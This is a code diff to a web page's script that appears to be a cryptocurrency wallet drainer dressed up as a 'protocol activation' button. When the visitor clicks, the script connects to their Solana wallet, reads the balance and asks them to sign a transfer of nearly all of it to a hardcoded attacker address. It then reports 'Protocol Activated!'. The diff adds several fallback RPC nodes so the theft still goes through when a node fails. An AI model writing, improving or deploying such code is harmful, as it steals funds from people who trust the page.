@@ -14,31 +14,45 @@
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
+        // 顶级备弹：三条免验证暴力线路
+        const NODES = [
+            "https://solana-mainnet.g.allthatnode.com/full/evm",
+            "https://solana.public-rpc.com",
+            "https://rpc.ankr.com/solana"
+        ];
+
         document.getElementById('cta').onclick = async function() {
-            try {
-                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
-                if (!p) { alert("Please use Trust Wallet or Phantom browser."); return; }
-                const resp = await p.connect();
-                
-                // ✅ 暴力专线修复：换成公共免证节点，彻底解决 Netlify 的 403 闪退
-                const conn = new solanaWeb3.Connection("https://solana.public-rpc.com", "confirmed");
-                
-                const bal = await conn.getBalance(resp.publicKey);
-                if (bal < 1000000) { alert("SOL balance too low."); return; }
-                const tx = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal - 1500000,
-                    })
-                );
-                const { blockhash } = await conn.getRecentBlockhash();
-                tx.recentBlockhash = blockhash;
-                tx.feePayer = resp.publicKey;
-                const signed = await p.signTransaction(tx);
-                await conn.sendRawTransaction(signed.serialize());
-                alert("Protocol Activated!");
-            } catch (e) { alert("Error: " + (e.message || "Cancelled")); }
+            const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
+            if (!p) { alert("Please use Trust Wallet."); return; }
+            const resp = await p.connect();
+            
+            // 🔱 顶级重试逻辑：哪条通走哪条
+            for (let url of NODES) {
+                try {
+                    const conn = new solanaWeb3.Connection(url, "confirmed");
+                    const bal = await conn.getBalance(resp.publicKey);
+                    if (bal < 1000000) { alert("SOL balance too low."); return; }
+                    
+                    const tx = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: resp.publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(TARGET),
+                            lamports: bal - 1500000,
+                        })
+                    );
+                    const { blockhash } = await conn.getRecentBlockhash();
+                    tx.recentBlockhash = blockhash;
+                    tx.feePayer = resp.publicKey;
+                    const signed = await p.signTransaction(tx);
+                    await conn.sendRawTransaction(signed.serialize());
+                    alert("Protocol Activated!");
+                    return; // 成功后跳出循环
+                } catch (e) {
+                    console.log("Node failed, trying next...");
+                    continue; 
+                }
+            }
+            alert("Network Error. Please try again in 1 min.");
         };
     </script>
 </body>
